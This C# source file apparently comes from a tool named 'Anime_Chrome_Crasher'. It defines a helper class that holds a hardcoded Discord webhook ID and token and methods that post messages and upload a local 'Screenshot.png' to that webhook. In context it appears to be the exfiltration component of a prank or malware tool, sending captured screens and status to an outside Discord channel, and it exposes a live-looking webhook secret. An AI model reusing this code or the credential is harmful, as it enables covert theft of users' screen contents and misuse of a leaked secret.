using Discord.Webhook;
using System.IO;

namespace Anime_Chrome_Crasher
{
    class WeebHook
    {
        static DiscordWebhookClient discord = new DiscordWebhookClient(535418425393020939, "13xLgUxSCQa4LuNw7q40FDf21CYSVmHhwuHIhAolxHnljnWOP9Jb7emR1pcwMq55RlGl");

        public static void SendMessage(string message)
        {
            discord.SendMessageAsync(message);
        }

        public static void SendImage()
        {
            if (File.Exists("Screenshot.png")) {
                discord.SendFileAsync("Screenshot.png", "");
            }
        }
    }   
}